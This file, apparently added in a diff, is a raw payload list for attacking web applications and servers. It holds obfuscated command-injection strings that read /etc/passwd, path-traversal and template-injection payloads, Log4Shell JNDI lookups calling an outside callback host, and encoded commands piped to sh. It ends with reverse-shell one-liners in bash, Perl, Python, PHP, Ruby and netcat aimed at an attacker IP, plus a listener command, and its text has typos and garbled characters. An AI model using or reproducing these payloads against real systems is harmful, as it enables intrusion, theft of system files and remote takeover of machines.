@@ -1,0 +1,73 @@
+The following examples assums the hacker IP is 10.20.14 and use port 8080 for the connection.
+Therefore in all f these cases you need to listen for port 8080 using the foolowing command
+nc -vv -l -p 8080
+{"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}  
+cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??
+"/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd /cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/etc/passwd /cgi-bin/.%2%65/.%2%65/.%2%65/.%2%65/etc/passwd /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
+/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
+/???/???/c?t$IFS/???/p?s?w?
+cat /etc/pa?swd
+cat /etc/paâ€™ssâ€™wd
+cat /etc/pa**wd
+ecâ€™hâ€™o â€˜cat /etc/examplewdâ€™ | sed â€˜s/example/pass/gâ€™ | bash
+${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
+/???/??t+/???/??ss??
+/?in/cat+/et?/passw?
+/etc/passwd
+/e?c/?asswd
+/e*c/*asswd
+/??c/?asswd
+/??c/?assw?
+`curl -L http://â’¼â“„â“„â’¼â“â’º.â’¸â“„â“‚`
+/???/??t+/???/??ss??
+/?in/cat+/et?/passw?
+$(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev)
+/???/??t /???/??ss??'." --
+cd..\..\..\..\ && dir
+cd..&&cd..&&cd..&&cd..&&dir
+cgi-bin/dmt/reset.cgi?db_prefix=%26id%26
+cgi-bin/reset.cgi?db_prefix=%26id%26
+../../../../../../e*c/p*s*d{{' http://server/...
+~${ OGNL Payload }
+%0a ls -la
+/???/???/c?t$IFS/???/p?s?w?
+${jndi${nagli:-:}ldap:${::-/}/${hostName}.anything.interact.sh/a}}
+/???/??t+/???/??ss??
+/?in/cat+/et?/passw?
+printf dW5hbWUgLWE= | base64 -d | sh
+; /b'i'n\/?at /e't'c\/\pa??\wd
+a=ca;b=t;$a$b /et*/p*s*wd
+$(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev)
+cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??
+cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??
+${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{callback_host}}/{{random}}}
+org.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec("uname -a").getInputStream())
+"${!#}<<<{\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}$#))\'\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}$#${##}))\'\$\'\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#${##}${##}))\'\$\'\\$(($((${##}<<${##}))#${##}$#$#${##}$#${##}${##}$#))\',\$\'\\$(($((${##}<<${##}))#${##}${##}$#${##}${##}${##}))\'\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}${##}))\',\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}${##}))\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#${##}$#$#))\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#))\\$(($((${##}<<${##}))#${##}${##}${##}$#$#${##}))\\$(($((${##}<<${##}))#${##}$#$#${##}$#$#$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#${##}$#$#))\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}${##}))\\$(($((${##}<<${##}))#${##}${##}${##}$#$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#$#$#))\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#${##}${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#${##}${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#${##}${##}${##}))\\$(($((${##}<<${##}))#${##}$#$#${##}$#$#$#$#))\'} ${!#}<<<{\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}$#))\'\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}$#${##}))\'\$\'\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#${##}${##}))\'\$\'\\$(($((${##}<<${##}))#${##}$#$#${##}$#${##}${##}$#))\',\$\'\\$(($((${##}<<${##}))#${##}${##}$#${##}${##}${##}))\'\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}${##}))\',\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}${##}))\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#${##}$#$#))\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#))\\$(($((${##}<<${##}))#${##}${##}${##}$#$#${##}))\\$(($((${##}<<${##}))#${##}$#$#${##}$#$#$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#${##}$#$#))\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}${##}))\\$(($((${##}<<${##}))#${##}${##}${##}$#$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#${##}${##}))\\$(($((${##}<<${##}))#${##}$#$#${##}$#${##}${##}$#))\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}$#${##}))\\$(($((${##}<<${##}))#${##}$#$#${##}$#$#$#$#))\\$(($((${##}<<${##}))#${##}$#$#${##}${##}${##}$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#${##}${##}${##}))\'}
+bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/ipAddress/port%200%3E%261%27
+php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
+cat /???/??ss??
+cat /e??/p????? 
+echo '61776b20277b7072696e742024307d27202f3f3f2a632f3f2a7764' | xxd -p -r | sh echo "U2FsdGVkX19AYgtqPB2JND9fswlDf/i2ZWP8FUTyqHS+7EUuA2meAMm9Cd1Z67lq1+e5qEUyJmBsvFsu5yzI3aftPy8q/qjIwVo8feoh1JM=" | openssl enc -d -des3 -base64 -pass pass:bex -pbkdf2 | sh | sh
+{{var this.getTemplateFilter().addAfterFilterCallback("system").filter("whoami")}}
+services.logging.getLogger("foo").error("Job content executed")
+%7B%22name%22%3A%22test.php%22%2C%22data%22%3A%22data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAIAAAD8GO2jAAAAVklEQVR4nGNcPD89JF9HRVRbMF0oJF9QT1NUWzFdKTs%2FPljAc143k%2FyPi9t%2BX9N9qif38ePJv1%2FvBnyyMFiXHMwwCkbBKBgFo2AUjIJRMApGwSgYfgAAI0oXArodV7QAAAAASUVORK5CYII%3D%22%7D
+system(â€œcat /etc/passwdâ€)
+
+BASH
+bash -i >& /dev/tcp/10.20.14.203/8080 0>&1
+
+PERL
+perl -e 'use Socket;$i="10.20.14";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.14",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+PHP
+php -r '$sock=fsockopen("192.168.0.101",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+Ruby
+ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+Netcat
+nc -e /bin/sh 192.168.0.101 8080
+
